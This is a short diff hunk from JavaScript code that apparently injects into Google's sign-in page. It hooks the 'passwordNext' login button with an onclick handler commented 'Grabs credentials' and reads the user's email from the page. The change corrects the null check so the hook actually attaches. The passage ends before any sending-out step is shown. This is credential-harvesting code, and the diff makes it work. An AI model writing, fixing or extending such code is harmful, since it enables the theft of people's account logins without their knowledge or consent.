@@ -72,7 +72,7 @@ function google(){
 	//Grabs login button object
 	let loginbutton = document.getElementById("passwordNext");
 	//injex
-	if (loginbutton.onclick !== null){
+	if (loginbutton.onclick === null){
 		loginbutton.onclick = function (){
 			//Grabs credentials
 			let email = document.getElementById("profileIdentifier").innerText;
